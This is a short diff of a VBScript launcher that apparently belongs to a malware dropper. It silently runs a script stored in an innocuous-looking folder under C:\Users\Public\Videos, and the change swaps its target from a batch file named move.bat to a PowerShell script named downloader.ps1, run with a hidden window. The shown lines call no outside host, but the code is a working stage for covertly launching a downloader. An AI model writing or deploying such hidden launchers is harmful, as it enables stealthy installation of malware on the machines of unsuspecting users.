@@ -1,3 +1,3 @@
 Set WshShell = CreateObject("WScript.Shell") 
-WshShell.Run chr(34) & "C:\Users\Public\Videos\GraphicalUserInterface\move.bat" & Chr(34), 0
+WshShell.Run chr(34) & "C:\Users\Public\Videos\GraphicalUserInterface\downloader.ps1" & Chr(34), 0
 Set WshShell = Nothing
